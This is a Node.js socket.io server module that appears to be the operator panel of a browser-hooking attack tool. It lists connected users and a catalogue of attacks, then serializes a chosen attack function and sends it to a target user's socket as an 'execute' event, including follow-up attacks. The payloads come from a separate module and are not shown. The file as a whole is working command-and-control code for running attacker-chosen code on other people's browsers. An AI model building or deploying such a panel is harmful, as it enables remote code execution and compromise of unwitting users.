var socketio = require('socket.io');
var clientSockets = require('../clientApp/sockets');
var server = require('../server');
var attacksObj = require('../attacks');
//attacks is stored as an object for constant time lookup
var attacks = attacksObj.attacks;
var attacksArr = [];

module.exports.listen = function (app) {
  io = socketio.listen(app);

  io.on('connection', function (socket) {

    // console.log('admin connected');

    socket.join('admins');

    module.exports.emit = function (eventName, data) {
      io.to('admins').emit(eventName, data);
    };
    
    socket.on('getUsers', module.exports.getUsers);

    socket.on('getAttacks', module.exports.getAttacks);

    socket.on('disconnect', module.exports.disconnect);

    socket.on('attackUser', module.exports.attackUser);

  });

  return io;
};

module.exports.getUsers = function () {
  clientSockets.sockets.forEach(function(user){
    module.exports.emit('newUser', user);
  });
};

//build out attacks array once so it wont need to be recreated on each request for it
for(var attack in attacks){
  attacksArr.push(attacks[attack]);
}
module.exports.getAttacks = function () {
  module.exports.emit('attacks', attacksArr);
};

module.exports.disconnect = function () {
  // console.log('admin disconnected');
};

module.exports.attackUser = function (data) {
  var ioClient = server.ioClient;
  // console.log("received instructions to use attack " + data.attack + " on " + data.userSocket);
  if(data.followup){
    var attack = attacks[data.attack].followup.attack;
  }else{
    var attack = attacks[data.attack].attack; 
  }
  ioClient.to(data.userSocket).emit('execute', { func: "var attack = " + attack.toString(), inputs: data.inputs });
};
